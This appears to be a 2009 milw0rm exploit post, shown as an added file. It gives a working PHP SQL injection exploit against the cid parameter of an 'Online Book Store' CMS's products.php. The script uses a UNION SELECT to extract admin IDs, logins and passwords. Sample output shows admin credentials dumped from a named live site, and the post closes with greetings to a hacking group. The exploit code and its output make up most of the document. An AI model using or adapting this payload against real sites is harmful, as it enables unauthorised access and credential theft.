@@ -1,0 +1,33 @@
+CMS : Online Book Store
+WEB  : http://www.virtuenetz.com/book/
+Archivo : products.php
+Variable Tipo : GET
+valor : cid
+Tipo : SQL Injection
+URL : http://www.site.com/products.php?cid=[SQLI]
+
+Exploit :
+<?
+$web  = $argv[1];
+$url = $web."products.php?cid=8+and+1=0+union+select+all+concat(0x756E646572,id,0x3A,login,0x3A,password,0x736563)+from+admin+limit+0,1";
+preg_match_all("/under(.*)sec/",file_get_contents($url),$salida, PREG_PATTERN_ORDER);
+$info = explode(":",$salida[1][0]);
+echo "ID :".$info[0]."\n";
+echo "Usuario : ".$info[1]."\n";
+echo "Password : ".$info[2]."\n";
+?>
+
+Ejemplo :
+undersec@Undersec:~/Escritorio$ php exploit.php http://www.virtuenetz.com/book/
+
+ID :1
+Usuario : admin
+Password : admin
+
+Gretz :
+C1c4tr1z(voodoo-labs.org),Nobody,1995,Lix (arrivalsec.wordpress.com),NanoNRoses,Codebreak(?),Nork And All Friends of Undersecurity.net.
+
+100% CHILE
+WWW.UNDERSECURITY.NET
+
+# milw0rm.com [2009-06-08]
